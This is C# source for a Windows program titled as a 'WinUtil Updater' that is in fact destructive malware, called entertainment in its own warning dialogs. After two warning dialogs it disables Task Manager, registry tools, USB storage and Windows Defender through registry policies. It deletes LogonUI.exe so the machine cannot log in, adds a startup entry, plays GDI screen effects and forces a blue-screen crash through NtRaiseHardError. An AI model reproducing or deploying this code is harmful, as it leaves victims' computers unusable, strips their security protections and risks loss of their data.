using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media.Animation;
using System.Security.Principal;
using System.Reflection;
using System.Timers;
using WinUtilPlus;
using System.ComponentModel;

namespace WinUtil__Updater
{
    public partial class MainWindow : Window
    {
        // TEST MODE
        public bool TestMode = false;

        // VARIABLES
        public bool Executed = false;

        private IEasingFunction SmoothTween { get; set; } = new QuarticEase { EasingMode = EasingMode.EaseInOut };
        Storyboard sb = new Storyboard();
        TimeSpan dur = TimeSpan.FromMilliseconds(500);
        TimeSpan dur2 = TimeSpan.FromMilliseconds(1000);
        public void Fade(DependencyObject TweenObj)
        {
            DoubleAnimation a1 = new DoubleAnimation() { From = 0, To = 1, Duration = new Duration(dur) };
            Storyboard.SetTarget(a1, TweenObj);
            Storyboard.SetTargetProperty(a1, new PropertyPath("Opacity", 1));
            sb.Children.Add(a1);
            sb.Begin();
            sb.Children.Remove(a1);
        }
        public void FadeOut(DependencyObject TweenObj)
        {
            DoubleAnimation a1 = new DoubleAnimation() { From = 1, To = 0, Duration = new Duration(dur) };
            Storyboard.SetTarget(a1, TweenObj);
            Storyboard.SetTargetProperty(a1, new PropertyPath("Opacity", 1));
            sb.Children.Add(a1);
            sb.Begin();
            sb.Children.Remove(a1);
        }
        public void FadeOut2(DependencyObject TweenObj)
        {
            DoubleAnimation a1 = new DoubleAnimation() { From = 1, To = 0, Duration = new Duration(dur) };
            Storyboard.SetTarget(a1, TweenObj);
            Storyboard.SetTargetProperty(a1, new PropertyPath("Opacity", 0));
            sb.Children.Add(a1);
            sb.Begin();
            sb.Children.Remove(a1);
        }
        public void ObjectShift(Duration speed, DependencyObject Object, Thickness Get, Thickness Set)
        {
            ThicknessAnimation Animation = new ThicknessAnimation()
            {
                From = Get,
                To = Set,
                Duration = speed,
                EasingFunction = SmoothTween,
            };
            Storyboard.SetTarget(Animation, Object);
            Storyboard.SetTargetProperty(Animation, new PropertyPath(MarginProperty));
            sb.Children.Add(Animation);
            sb.Begin();
            sb.Children.Remove(Animation);
        }
        public void FasterObjectShift(DependencyObject Object, Thickness Get, Thickness Set)
        {
            ThicknessAnimation Animation = new ThicknessAnimation()
            {
                From = Get,
                To = Set,
                Duration = TimeSpan.FromMilliseconds(750),
                EasingFunction = SmoothTween,
            };
            Storyboard.SetTarget(Animation, Object);
            Storyboard.SetTargetProperty(Animation, new PropertyPath(MarginProperty));
            sb.Children.Add(Animation);
            sb.Begin();
            sb.Children.Remove(Animation);
        }

        public static string HttpGet(string url)
        {
            using (var wc = new WebClient())
            {
                wc.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                return wc.DownloadString(url);
            }
        }
        public MainWindow()
        {
            InitializeComponent();
        }

        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            if (IsAdministrator() == true)
            {
                WindowLoad3();
            } else
            {
                await Task.Delay(500);
                Fade(omg);
                Fade(upt_man);
                await Task.Delay(dur);
                Fade(ts_menu_icon);
                await Task.Delay(dur2);
                Fade(ts_menu_test);
                await Task.Delay(5000);
                FadeOut2(upt_man);
                FadeOut2(ts_menu_icon);
                FadeOut2(ts_menu_test);
                FadeOut2(omg);
                await Task.Delay(2000);
                WindowLoad2();
            }
        }

        private async void WindowLoad2()
        {
            try {
                StartAsAdmin(Assembly.GetExecutingAssembly().Location);
                Environment.Exit(0);
            } catch
            {
                ShowInTaskbar = true;
                Fade(omg);
                await Task.Delay(500);
                Fade(ts_error);
                Fade(ts_error_1);
            }
        }

        public static void StartAsAdmin(string fileName)
        {
            var proc = new Process
            {
                StartInfo =
        {
            FileName = fileName,
            UseShellExecute = true,
            Verb = "runas"
        }
            };

            proc.Start();
        }

        private void WindowLoad3()
        {
            MessageBoxResult msgResult = MessageBox.Show(
                "en-hk: What you have just executed is a malware.\nYou will lose all your data if you still continue.\nNo: Nothing bad happens and your PC will have a happy life!\nStill want to execute this shit?\n" +
                "\nzh-hk: 你剛開啓的檔案是病毒軟件。\n如果你按OK，所有資料將會消失。\nNo: 沒事發生，而且你的電腦會很開心\n還要繼續嗎？",
                "Snw Development",
                MessageBoxButton.YesNo,
                MessageBoxImage.Warning,
                MessageBoxResult.No
            );
            if (msgResult == MessageBoxResult.No) {
                Environment.Exit(0);
            } else
            {
                msgResult = MessageBox.Show(
                    "en-hk: It's time to stop. Your PC does not want the pain it is going to get.\n\n-> THIS IS THE LAST WARNING!\n" +
                    "THE CREATOR OF THIS PIECE OF SHIT WILL NOT BE RESPONSIBLE FOR ANY DESTRUCTION CAUSED BY THIS SHIT!\n" +
                    "STILL RUN???\n" +
                    "This piece of shit is not meant to be malicious but for ENTERTAINMENT AND EDUCATIONAL PURPOSES.\n" +
                    "\n\n" +
                    "DO YOU STILL WANT TO RUN THIS SHIT, RESULT IN AN UNUSABLE MACHINE?\n\n" +
                    "(This shit won't spread through devices with same internet [I guess] [Windows Only])\n\n\n" +
                    "zh-hk: 你要繼續啓用，造成永久電腦傷害？",
                    "Snw Development (LAST WARNING!!!)",
                    MessageBoxButton.YesNo,
                    MessageBoxImage.Warning,
                    MessageBoxResult.No
                );
                if (msgResult == MessageBoxResult.No)
                {
                    Environment.Exit(0);
                } else
                {
                    Hide();
                    OVERWRITE_T();
                    Payload1();
                    Executed = true;
                }
            }
        }

        // __ Overwrite
        [DllImport("ntdll.dll", SetLastError = false)]
        private static extern int NtSetInformationPorcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        int isc = 1;
        const int TerminationBSODCode = 0x1D;

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool ExitWindowsEx(uint uFlags, uint dwReason);
        [DllImport("ntdll.dll")]
        public static extern void RtlAdjustPrivilege(uint Privilege, bool Enable, bool CurrentThread, out byte PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern void NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("kernel32.dll")]
        public static extern void ExitProcess(uint uExitCode);

        private void OVERWRITE_T() {
            if (TestMode == true) return;
            Process.EnterDebugMode();
            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
                key.SetValue("NoChangingWallPaper", 1);
                key.Dispose();
            }
            catch { }
            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                key.SetValue("DisableTaskMgr", 1);
                key.Dispose();
            }
            catch { }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                key.SetValue("DisableRegistryTools", 1);
                key.Dispose();
            }
            catch { }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                key.SetValue("NoRun", 1);
                key.Dispose();
            }
            catch { }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                key.SetValue("NoWinKeys", 1);
                key.Dispose();
            }
            catch { }

            try
            {
                RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\usbstor");
                key.SetValue("Start", 4);
                key.Dispose();
            }
            catch { }

            try
            {
                RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
                key.SetValue("DisableAntiSpyware", 1);
                key.Dispose();
            }
            catch { }

            try
            {
                Process prx = new Process() {
                    StartInfo = { FileName = "C:\\windows\\system32\\takeown.exe", Arguments = "/f C:\\windows\\system32\\LogonUI.exe", WindowStyle = ProcessWindowStyle.Hidden, Verb = "runas" }
                };
                prx.Start();
                try
                {
                    Process prcx = new Process();
                    prcx.StartInfo.FileName = "C:\\windows\\system32\\icacls.exe";
                    prcx.StartInfo.Arguments = @"C:\\windows\\system32\\LogonUI.exe /granted """ + Environment.GetEnvironmentVariable("USERNAME") + @""":F";
                    prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    prcx.StartInfo.Verb = "runas";
                    prcx.Start();
                }
                catch { }
                try
                {
                    if (File.Exists("C:\\windows\\system32\\LogonUI.exe"))
                    {
                        File.Delete("C:\\windows\\system32\\LogonUI.exe");
                    }
                } catch
                {
                    new Process() { 
                        StartInfo =
                        {
                            FileName = "C:\\windows\\system32\\cmd.exe",
                            Arguments = "/c del C:\\windows\\system32\\LogonUI.exe /f",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            Verb = "runas",
                        }
                    }.Start();
                }
            } catch { }

            try {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("NothingWorthTheRisk", "wininit.exe");
            } catch { }

        }

        // Payload Functions

        #pragma warning disable CS4014 

        private async void Payload1() {
            Task.Run(() => GDI.InvertTweenLeftTop(true));
            await Task.Delay(15000);
            Payload1_Ended();
        }

        private async void Payload2()
        {
            Task.Run(() => GDI.Cubes(true));
            await Task.Delay(10000);
            Payload2_Ended();
        }

        private async void Payload3()
        {
            Task.Run(() => {
                GDI.Trains(true);
            });
            await Task.Delay(5000);
            Payload3_Ended();
        }

        private async void Payload4()
        {
            Task.Run(() => GDI.Darkr(true));
            await Task.Delay(9000);
            Payload4_Ended();
        }

        private async void Payload5()
        {
            Task.Run(() => GDI.RgbTrain(true));
            await Task.Delay(9000);
            Payload5_Ended();
        }

        private void ForceCrashWindows()
        {
            if(TestMode)
            {
                MessageBox.Show("Payload Ended [DEBUG]: Crash Windows");
                return;
            }

            try
            {
                RtlAdjustPrivilege(0x13, true, false, out byte unused1);
                NtRaiseHardError(0xdeaddead, 0, 0, IntPtr.Zero, 6, out uint unused2);
                ExitProcess(0);
            }
            catch { }
        }

#pragma warning restore CS4014

        // Handlers
        private void Payload1_Ended()
        {
            GDI.InvertTweenLeftTop(false);
            Payload2();
        }

        private void Payload2_Ended() {
            GDI.Cubes(false);
            Payload3(); 
        }

        private void Payload3_Ended()
        {
            GDI.Trains(false);
            Payload4();
        }

        private void Payload4_Ended()
        {
            GDI.Darkr(false);
            Payload5();
        }

        private async void Payload5_Ended()
        {
            GDI.RgbTrain(false);
            await Task.Delay(2000);
            ForceCrashWindows();
        }

        // Protection

        private void win64_protection(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if(Executed == true && TestMode == false)
            {
                e.Cancel = true;
            }
        }
    }
}
